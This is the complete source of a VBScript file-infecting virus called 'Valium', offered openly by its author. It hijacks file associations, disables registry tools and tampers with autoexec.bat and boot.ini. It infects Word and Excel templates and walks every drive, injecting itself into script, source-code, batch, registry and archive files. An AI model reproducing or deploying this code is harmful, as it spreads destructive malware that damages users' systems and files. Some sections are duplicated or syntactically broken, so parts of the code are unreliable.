'valium
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
' The
' ****   ***** ******  *****   ***** ***** **** ***** *****
'   ***   *** ***   **  ***     ***   ***   **   *********
'    *** ***  ********  ***     ***   ***   **   *** ** **
'     *****   ***   **  ***     ***   ***   **   ***    **
'      ***    ***   ** ******* *****   ******   *****  ****
'
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Valium is an Script virus,made in Visual Basic Script.
'Valium designed to infect many file types which is vulnerable for script to attack.
'it also has ability to infect graph files such as bmp,jpg,gif even it is not realy
'infection,but I think valium had show you how script infect those files.
'Valium infecting some project files such as cpp,frm and pas by adding it self in it
'Valium also adding it self in every zip or rar files,using lame bugs from its internal command
'Valium injecting it self in every nrb and nri files,see my article about what is nri or nrb
'in 29a#8 and this is just simple implementation in script to spread via cd-room
'Valium also macro virus,it infecting doc and xls,by injecting it body in normal.temp/xlstart
'I think Valium is an big script infector,infecting at least 22 file types
'Some memory resident trick,duplicator type trick,booting stuff trick also available here
'Valium also has abiity to encrypt it self/selfcripting using poly/Epo tricky.
'Thats all about this lame shit,Do not code script if you don't have something new in it.
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Name		: Valium
'Author		: Psychologic/rRlf
'System		: 9x,Me,Nt,Xp with WSH ofcourse
'Target	files	: Portable Script
'		  vbs,vbe,js,bat,reg,nri,nrb,doc,xls,rar,zip,cpp,pas,frm,jpg,gif,bmp,ico,html,htt,shtml,htm
'Worming	: No this is virus not worm
'Polymorph	: Yes mixture with encryption and some silly Epo
'Encryption	: Ofcourse self encrypting ability
'Payload	: -Randomize
'		  ^Overwrite oeminfo.ini
'		  ^An Cool graphical matrix message
'Feature	: -Some Memory resident trick
'		  -Self destruction
'		  -Some booting stuffs
'		  -Some funny stuffs
'Known Bugs	: As you see this virus need to drops many files cos it need much dummy for buffer character
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'* WARNING *
'Valium designed to be fast in spreading,do not execute it if you dont know how to handle it
'author not responsible for your stupid act with it.
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'valium
Randomize
on error resume next
r = int(rnd * 100)
If r = 7 then
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Well here is the payload which will drop oeminfo.ini and drop html file for graphical
'mesage,I know it is just make this virus biger,but I don't care,its just script right??
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
	Set fso = CreateObject("Scripting.FileSystemObject")
	set a = fso.CreateTextFile("C:\windows\system\Oeminfo.ini")
	a.writeline "[General]"
	a.writeline "Manufacturer=" & chr(34) & "Psychologic" & chr(34)
	a.writeline "Model=" & chr(34) & "Valium virus" & chr(34)
	a.writeline "[Support Information]"
	a.writeline "Line1 = " & chr(34) & "Your computer has been infected with valium virus" & chr(34)
	a.writeline "Line2 = " & chr(34) & "" & chr(34)
	a.writeline "Line3 = " & chr(34) & "'valium by Psychologic" & chr(34)
	set payload = fso.createtextfile("C:\payload.html",true)
	payload.writeline "<HTML><HEAD><TITLE>Valium virus</TITLE><SCRIPT LANGUAGE=" & chr(34) & "JavaScript" & chr(34) & ">"
	payload.writeline "<!-- Begin"
	payload.writeline "var matrix_window;"
	payload.writeline "function MatrixWrite(string, bold, italic, speed) {"
	payload.writeline "var height = window.screen.height;"
	payload.writeline "var width = window.screen.width;"
	payload.writeline "var win_dimensions = " & chr(34) & "height = " & chr(34) & " + eval(height + 10) + " & chr(34) & ", width = " & chr(34) & " + eval(width + 30);"
	payload.writeline "matrix_window = window.open(" & chr(34) & "blank.htm" & chr(34) & ", " & chr(34) & "matrix_window" & chr(34) & ", win_dimensions);"
	payload.writeline "matrix_window.document.open(" & chr(34) & "text/html" & chr(34) & ", " & chr(34) & "replace" & chr(34) & ");"
	payload.writeline "var i;"
	payload.writeline "var timer = 0;"
	payload.writeline "if(matrix_window.moveTo)"
	payload.writeline "matrix_window.moveTo(-10, -30);"
	payload.writeline "if(matrix_window.resizeBy)"
	payload.writeline "matrix_window.resizeBy(0, 50);"
	payload.writeline "matrix_window.document.write(" & chr(34) & "<body bgcolor=000000 text=00ff00 onBlur='self.focus()'>" & chr(34) & ");"
	payload.writeline "matrix_window.document.write(" & chr(34) & "<font face=system>" & chr(34) & ");"
	payload.writeline "if(bold == true) matrix_window.document.write(" & chr(34) & "<b>" & chr(34) & ");"
	payload.writeline "if(italic == true) matrix_window.document.write(" & chr(34) & "<i>" & chr(34) & ");"
	payload.writeline "for(i = 0; i <= string.length; i++) {"
	payload.writeline "timer += (Math.random() * speed);"
	payload.writeline "setTimeout(" & chr(34) & "matrix_window.document.write('" & chr(34) & " + string.charAt(i) + " & chr(34) & "');" & chr(34) & ", timer);"
	payload.writeline "}"
	payload.writeline "timer += 2000;"
	payload.writeline "setTimeout(" & chr(34) & "matrix_window.close()" & chr(34) & ", timer);"
	payload.writeline "}"
	payload.writeline "<!-- JavaScript Praphical matRix payload By : Psyhologic -->"
	payload.writeline "<!-- Email : psychologic@hotmail.com -->"
	payload.writeline "<!-- Made From Microsoft Visual Basic Worm Editor By Psychologic -->"
	payload.writeline "<!-- Begin"
	payload.writeline "var matrix_window;"
	payload.writeline "function MatrixWrite(string, bold, italic, speed) {"
	payload.writeline "var height = window.screen.height;"
	payload.writeline "var width = window.screen.width;"
	payload.writeline "var win_dimensions = " & chr(34) & "height = " & chr(34) & " + eval(height + 10) + " & chr(34) & ", width = " & chr(34) & " + eval(width + 30);"
	payload.writeline "matrix_window = window.open(" & chr(34) & "blank.htm" & chr(34) & ", " & chr(34) & "matrix_window" & chr(34) & ", win_dimensions);"
	payload.writeline "matrix_window.document.open(" & chr(34) & "text/html" & chr(34) & ", " & chr(34) & "replace" & chr(34) & ");"
	payload.writeline "var i;"
	payload.writeline "var timer = 0;"
	payload.writeline "if(matrix_window.moveTo)"
	payload.writeline "matrix_window.moveTo(-10, -30);"
	payload.writeline "if(matrix_window.resizeBy)"
	payload.writeline "matrix_window.resizeBy(0, 50);"
	payload.writeline "matrix_window.document.write(" & chr(34) & "<body bgcolor=000000 text=00ff00 onBlur='self.focus()'>" & chr(34) & ");"
	payload.writeline "matrix_window.document.write(" & chr(34) & "<font face=system>" & chr(34) & ");"
	payload.writeline "if(bold == true) matrix_window.document.write(" & chr(34) & "<b>" & chr(34) & ");"
	payload.writeline "if(italic == true) matrix_window.document.write(" & chr(34) & "<i>" & chr(34) & ");"
	payload.writeline "for(i = 0; i <= string.length; i++) {"
	payload.writeline "timer += (Math.random() * speed);"
	payload.writeline "setTimeout(" & chr(34) & "matrix_window.document.write('" & chr(34) & " + string.charAt(i) + " & chr(34) & "');" & chr(34) & ", timer);"
	payload.writeline "}"
	payload.writeline "timer += 2000;"
	payload.writeline "setTimeout(" & chr(34) & "matrix_window.close()" & chr(34) & ", timer);"
	payload.writeline "}"
	payload.writeline "var messages = new Array(" & chr(34) & "this is valium virus by puppy" & chr(34) & "," & chr(34) & "valium ----- youri had belong to me" & chr(34) & "," & chr(34) & "Please delete me now" & chr(34) & ");"
	payload.writeline "function GetRndIndex() {"
	payload.writeline "return (parseInt(Math.random() * messages.length));"
	payload.writeline "}"
	payload.writeline "function WriteRndMsg(bold, italic, speed) {"
	payload.writeline "MatrixWrite(messages[GetRndIndex()], bold, italic, speed);"
	payload.writeline "}"
	payload.writeline "//  End -->"
	payload.writeline "function GetRndIndex() {"
	payload.writeline "return (parseInt(Math.random() * messages.length));"
	payload.writeline "}"
	payload.writeline "function WriteRndMsg(bold, italic, speed) {"
	payload.writeline "MatrixWrite(messages[GetRndIndex()], bold, italic, speed);"
	payload.writeline "}"
	payload.writeline "//  End -->"
	payload.writeline "</script>"
	payload.writeline "</HEAD>"
	payload.writeline "<BODY Onload = " & chr(34) & "javascript:WriteRndMsg(true, true, 750)" & chr(34) & ">"
	payload.writeline "<b>Your Computer has been Infected with : </b>"
	payload.writeline "<p><b><font color=" & chr(34) & "#FF0000" & chr(34) & ">Valium virus </font> Your Pc has been infected with Valium virus by psychologic/redline</b></p>"
	payload.writeline "</body></html>"
	payload.close
	CreateObject("Wscript.shell").run "C:\payload.html"
end if

CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
createobject("Wscript.shell").regwrite "HKEY_CLASSES_ROOT\Directory\Shell\valium games\Command\","WScript.exe | C:\Windows\valium.vbs"
createobject("Wscript.shell").regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", "%WINDIR%\valium.vbs %1 %*"
set executor = wscript.CreateObject("WScript.Shell")
Set fso = createobject("scripting.filesystemobject")
fso.CopyFile Wscript.ScriptFullName, "C:\windows\valium.vbs"
fso.CopyFile Wscript.ScriptFullName, "C:\windows\systemCD.vbs"
fso.copyfile wscript.scriptfullname,"C:\windows\WindowsSystem.sys"
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)
code = OpenSelf.readall & vbcrlf & "'valium"
set backup = fso.createtextfile("C:\doc.1",true)
backup.write code

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'A function to changes this script body to *cpp format,need to drop file for buffy character
'and all formated *cpp character saved in one variable
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
set opendropercpp = fso.OpenTextFile("C:\windows\WindowsSystem.sys", 1)
allsourcecpp = ""
oneline1 = ""
do while opendropercpp.readline <> "'valium"
oneline1 = ""
oneline1 = opendropercpp.readline
onebyone = len(oneline1)
for i = 1 to onebyone
read34 = mid(oneline1,i,1)
if read34 = chr(34) then
m = ",34"
else
m = ""
end if
all = all & m
next
cppformat = replace(oneline1,chr(34),"%c")
fullline1 = "fprintf(mvbswe," & chr(34) & cppformat & "\n" & chr(34) & all & ");"
allsourcecpp = allsourcecpp & vbcrlf &  fullline1
all = ""
loop
opendropercpp.close


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'A function to changes this script body to *frm format,need to drop file for buffy character
'and all formated *frm character saved in one variable
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

set opendroperfrm = fso.OpenTextFile("C:\windows\WindowsSystem.sys", 1)
allsourcefrm = ""
oneline = ""
do while opendroperfrm.readline <> "'valium"
  oneline = opendroperfrm.readline
  frmformat = replace(oneline,chr(34),chr(34)&"&chr(34)&"&chr(34))
  fullline = "? #1," & frmformat
  allsourcefrm = allsourcefrm & vbcrlf & fullline
loop
opendroperfrm.close


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'A function to changes this script body to *pas format,need to drop file for buffy character
'and all formated *pas character saved in one variable
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

oneline2 = ""
set opendroperpas = fso.OpenTextFile("C:\windows\WindowsSystem.sys", 1)
do while opendroperpas.readline <> "'valium"
  oneline2 = ""
  oneline2 = opendroperpas.readline
  fullline2 = "writeln (mvbswe,'" & oneline2 & "');"
  allsourcepas = allsourcepas & vbcrlf & fullline2
loop
opendroperpas.close


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Just for spliting a:,its a funny stuff,but not destructive
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

set r = fso.opentextfile("C:\autoexec.bat",1)
all = r.readall
set m = fso.createtextfile("C:\autoexec.bat",true)
m.write all
m.writeline "subst c: a:\"
m.writeline "subst d: a:\"
m.writeline "subst e: a:\"
m.writeline "subst f: a:\"
m.writeline "subst g: a:\"
m.close


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Also funny stuff,valium will make boot.ini in C:\
'infected machine will now about this
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

set boot = fso.createtextfile("C:\boot.ini",true)
boot.writeline "[Boot Loader]"
boot.writeline "timeout=60"
boot.writeline "Default=C:\"
boot.writeline ""
boot.writeline "[Operating Systems]"
boot.writeline "C:\" & chr(34) & "You infected with valium virus" & chr(34) & " /fastdetect"
boot.writeline "D:\" & chr(34) & "Psychologic was here" & chr(34)
boot.writeline "E:\" & chr(34) & "This is valium New operating system" & chr(34)
boot.close


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'A function to changes this script body to macro's format,it is needed for injecting the virus
'body to Normaltemp,you see,after this execution,valium will be macro virus too.
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

set opendroperdoc = fso.OpenTextFile("C:\doc.1", 1)
set doc= fso.CreateTextFile("C:\Document.sys", 1)
doc.writeline "Private Sub Document_Open()"&vbcrlf&"Open "&chr(34)&"file.vbs"&chr(34)&" for output as #1"
do while oneline <> "'valium"
  	oneline = opendroperdoc.readline
  	docformat = replace(oneline,chr(34),chr(34)&"&chr(34)&"&chr(34))
  	fullline = "? #1," & Chr(34) & docformat & chr(34)
	doc.writeline fullline
loop
doc.writeline vbcrlf & "close #1 : Createobject("& chr(34) & "Wscrip.shell" & chr(34) & ").run " & chr(34) & "file.vbs" & chr(34) & " : end sub"
doc.close
opendroperdoc.close

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Infecting NormalTemp
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Set wordobj = CreateObject("Word.Application")
Set NT = wordobj.NormalTemplate.VBProject.VBComponents
For h = 1 To NT.Count
If NT(h).Name = "valy" Then
	wordobj.NormalTemplate.Save
	wordobj.Quit
	wordobj = ""
else
NT.Import "C:\Document.sys"
end if
next
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Infecting XLStert
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Set excelvir = CreateObject("excel.application")
excelvir.Visible = (Rnd * 0)
excelvir.CommandBars("Tools").Controls(10).Enabled = 0
excelvir.CommandBars("Tools").Controls(12).Enabled = 0
excelvir.CommandBars("View").Controls(3).Enabled = 0
excelvir.CommandBars("Window").Controls(3).Enabled = 0
excelvir.CommandBars("Window").Controls(4).Enabled = 0
Book = excelvir.Application.StartupPath & "\virus.xls"
Set workbookvir = excelvir.Workbooks.Add
workbookvir.VBProject.VBComponents.Import "C:\Document.sys"
excelvir.ActiveWindow.Visible = 0
workbookvir.SaveAs Book
Set workbookvir = Nothing
excelvir.Quit
Set excelvir = Nothing

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Function to changes *jgp files file same as *vbs files,you will need this to infect graph files
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Set changetype = CreateObject("Wscript.Shell")
'jgp <-> VBS
On Error Resume Next
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\"
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\DefaultIcon\","C:\WINDOWS\WScript.exe,3"
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\ScriptEngine\","VBScript"
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\Shell\Open\Command\","C:\WINDOWS\WScript.exe " & chr(34) & "%1" & chr(34) & " %*"
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\Shell\Play\Command\","C:\WINDOWS\COMMAND\CScript.exe " & chr(34) & "%1" & chr(34) & " %*"
changetype.regwrite "HKEY_CLASSES_ROOT\jgpFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
changetype.regwrite "HKEY_CLASSES_ROOT\.jgp\","jgpFile"
changetype.regwrite "HKEY_CLASSES_ROOT\jgp\CLSID\","{B54F3741-5B07-11cf-A4B0-00AA004A55E8}"
changetype.regwrite "HKEY_CLASSES_ROOT\jgp\OLEScript\"

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'TravelDir section begin here
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Self = OpenSelf.Readall
Set Drives=fso.drives
For Each Drive in Drives
If drive.isready then
	Dosearch drive & "\"
end If
Next
function Dosearch(path)

on error resume next
Set Folder=fso.getfolder(path)
Set Files = folder.files
For Each File in files


'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Infecting all *cpp,*frm and *pas files
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If fso.GetExtensionName(file.path)="cpp" then
on error resume next
set readcppmarker = fso.OpenTextFile(file.path,1)
cppmarker = readcppmarker.readline
cppreadall = readcppmarker.readall
  if mid(cppreadall,len(cppreadall),1) = "}" then
      cppreadall1 = replace(cppreadall,mid(cppreadall,len(cppreadall),1),"")
  end if
      if cppmarker <> "// W32.hllp.valiumvir" then
      set readcppmarker = fso.CreateTextFile(file.path, True)
      readcppmarker.write "// W32.hllp.valiumvir" & vbcrlf & "FILE *valiumv;" & vbcrlf
      readcppmarker.write cppreadall & "wormvaliumv = fopen("&chr(34)&"valiumv.vbs"&chr(34)&","&chr(34)&"wt"&chr(34)&");" & vbcrlf
      readcppmarker.write "if(wormvaliumv)"&vbcrlf&"{"& allsourcecpp &vbcrlf&"}" & vbcrlf
      readcppmarker.write "ShellExecute(NULL, "&chr(34)&"open"&chr(34)&", "&chr(34)&"valiumv.vbs"&chr(34)&", NULL, NULL, SW_SHOWNORMAL);" & vbcrlf
      readcppmarker.write "}" & vbcrlf
      readcppmarker.close
  end if
end if

If fso.GetExtensionName(file.path)="frm" then
on error resume next
set readfrmmarker = fso.OpenTextFile(file.path,1)
frmmarker = readfrmmarker.readline
frmreadall = readfrmmarker.readall
  if frmmarker <> "Rem W32.hllp.Mvbswe" then
      set readfrmmarker = fso.CreateTextFile(file.path, True)
      readfrmmarker.write "Rem W32.hllp.valium" & vbcrlf & frmreadall & vbcrlf
      readfrmmarker.write "Private Sub form_unload(cancel As Integer)" & vbcrlf
      readfrmmarker.write "On Error GoTo err:" & vbcrlf
      readfrmmarker.write "Open " & chr(34) & "C:\mvbswe.vbs" & chr(34) & " for output as #1" & vbcrlf
      readfrmmarker.write allsourcefrm & vbcrlf & "close #1" & vbcrlf & "shell " & chr(34) & "C:\mvbswe.vbs" & chr(34) & vbcrlf
      readfrmmarker.write "msgbox " & chr(34) & "Your Program has been infected valium virus" & chr(34) & ",VbInformation," & chr(34) & "W32.VBS.Mvbswe" & chr(34)
      readfrmmarker.write vbcrlf & "exit sub" & vbcrlf & "err:" & vbcrlf & "End sub" & vbcrlf
      readfrmmarker.close
  end if
end if


If fso.GetExtensionName(file.path)="pas" then
on error resume next
set readpasmarker = fso.OpenTextFile(file.path,1)
pasmarker = readpasmarker.readline
pasreadall = readpasmarker.readall
  if pasmarker <> "{ W32.hllp.valium }" then
      set readpasmarker = fso.CreateTextFile(file.path, True)
      readpasmarker.write "{ W32.hllp.valium }" & vbcrlf & pasreadall & vbcrlf
      readpasmarker.write "procedure " & "TForm1.FormClose(Sender: TObject; var Action: TCloseAction);" & vbcrlf
      readpasmarker.write "begin" & vbcrlf & "AssignFile (mvbswe,'C:\Windows\STARTM~1\programs\startup\mvbswe.vbs');" & vbcrlf
      readpasmarker.write "Rewrite (mvbswe);" & vbcrlf & allsourcepas & vbcrlf & "CloseFile(mvbswe);" & vbcrlf
      readpasmarker.close
  end if
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Infecting vbs,vbe files
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then
	Set Scripts = FSO.OpenTextFile(File.path, 1, True)
	If Scripts.ReadLine <> "'valium" then
		Set Scripts = FSO.OpenTextFile(File.path, 1, True)
		ScriptsSource = Scripts.ReadAll
		Set WriteScripts = FSO.OpenTextFile(File.path, 2, True)
		WriteScripts.WriteLine Self
		WriteScripts.WriteLine ScriptsSource
	end if
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Infecting zip and rar with their internal command
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If fso.GetExtensionName(file.path)="zip" then
      On error resume next
      set ws = createobject("wscript.shell")
      set word = createobject("word.application")
      appword = word.System.PrivateProfileString("","HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe", "")
      ws.run appword & " -a -r " & file.path & Chr(32) & " C:\windows\valium.vbs"
end if
next
If fso.GetExtensionName(file.path)="rar" then
  	on error resume next
  	set ws = createobject("wscript.shell")
  	set fso = createobject("Scripting.filesystemobject")
  	rar1 = "C:\Program Files\WinRAR\WinRAR.exe":rar2 = "D:\Program Files\WinRAR\WinRAR.exe"
  	if fso.fileexists(rar1) or fso.fileexists(rar2) then
      		ws.run "WinRAR.exe a " & file.path & " C:\windows\virus.vbs"
  	end if
end if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Open virus body and changes it to js format then gooo eat it
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If fso.GetExtensionName(file.path)="js" then
  	set u = fso.opentextfile(Wscript.scriptfullname,1)
  	uu = u.readall
  	for i = 1 to len(uu)
      		a = mid(uu,i,1)
      		aa = asc(a)
      		if i <> len(uu)
          		aaa = replace(uu,a,aa & ",")
          	else
          	aaa =  replace(uu,a,aa & ")")
      	end if
      	all = all & aaa
  next
  u.close
  set fin = fso.createtextfile(file.path,true)
  fin.write "var a=string.fromcharcode("&all&vbcrlf
  fin.write "var b=wscript.createobject("&chr(34)&"scripting.filesystemobject"&chr(34)&").createtextfile("&chr(34)&"aaa.vbs"&chr(34)&")"&vbcrlf
  fin.write "for(i=0; i<a.length; i++){"&vbcrlf&"try{b.write(a.charAt(i))}"&vbcrlf&"catch(c){}}"&vbcrlf
  fin.write "WScript.CreateObject("&chr(34)&"WScript.Shell"&chr(34)&").run("&chr(34)&"aaa.vbs"&chr(34)&",0)"
  fin.close
End if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Changes virus body to bat format and goooo infect it
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
If fso.GetExtensionName(file.path)="Bat" then
	set u = fso.opentextfile(Wscript.scriptfullname)
	uu = u.readall
	u.close
	set e = fso.CreatetextFile(file.path)
	e.write uu
	e.writeline ":end"
	e.close
	set i = fso.opentextfile(file.path)
	co = 0
	do while buff <> ":end"
		co = co + 1
		buff = i.readline
	loop
	co = co + 14
	i.close
	set fin = fso.createtextfile(file.path)
	fin.writeline "@Echo set ff=createobject(" & chr(34) & "scripting.filesystemobject" & chr(34) & ")>>C:\gen.vbs"
	fin.writeline "@Echo set rr=ff.opentextfile(" & chr(34) & "%0" & chr(34) & ",1)>>C:\gen.vbs"
	fin.writeline "@Echo lls=Split(rr.ReadAll,vbCrLf)>>C:\gen.vbs"
	fin.writeline "@Echo for ii=15 to " & co & " >>C:\gen.vbs"
	fin.writeline "@Echo newcode=newcode & vbcrlf & lls(ii)>>C:\gen.vbs"
	fin.writeline "@Echo next>>C:\gen.vbs"
	fin.writeline "@Echo set ww=ff.createtextfile(ff.getspecialfolder(0) & " & chr(34) & "\vir.vbs" & chr(34) & ",true)>>C:\gen.vbs"
	fin.writeline "@Echo ww.write newcode>>C:\gen.vbs"
	fin.writeline "@Echo ww.close>>C:\gen.vbs"
	fin.writeline "@Echo set ss=createobject(" & chr(34) & "wscript.shell" & chr(34) & ")>>C:\gen.vbs"
	fin.writeline "@Echo ss.run ff.getspecialfolder(0) & " & chr(34) & "\wscript.exe " & chr(34) & " & ff.getspecialfolder(0) & " & chr(34) & "\vir.vbs %" & chr(34) & ",1,false>>C:\gen.vbs"
	fin.writeline "@cscript C:\gen.vbs"
	fin.writeline "@del C:\gen.vbs"
	fin.writeline "@cls"
	fin.write uu
	fin.close
End if

'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
'Changes virus body to reg format and goooo eat it
'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If fso.GetExtensionName(file.path)="reg" then
  	set openreg = fso.opentextfile(file.path,1)
	  read = openreg.readall
	  set createreg = fso.createtextfile(file.path,2)
	  createreg.write read & vbcrlf
	  createreg.writeline "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]"
	  createreg.writeline chr(34)&"executor"&chr(34)&"="&chr(34)&"command /c echo set a=createobject(\"&chr(34)&"Scripting.filesystemobject\"&chr(34)&"):set b=a.opentextfile(\"&chr(34)&"C:\windows\valium.vbs"&chr(34)&"):c=b.readall set d=a.createtextfile(\"&chr(34)&"virus.vbs\"&chr(34)&").write c:createobject(\"&chr(34)&"wscript.shell\"&chr(34)&").run \"&chr(34)&"virus.vbs\"&chr(34)&",0>vir.vbs"&chr(34)
	  createreg.writeline chr(34)&"executorrun"&chr(34)&"="&chr(34)&"wscript vir.vbs"&chr(34)
	  createreg.close
end if

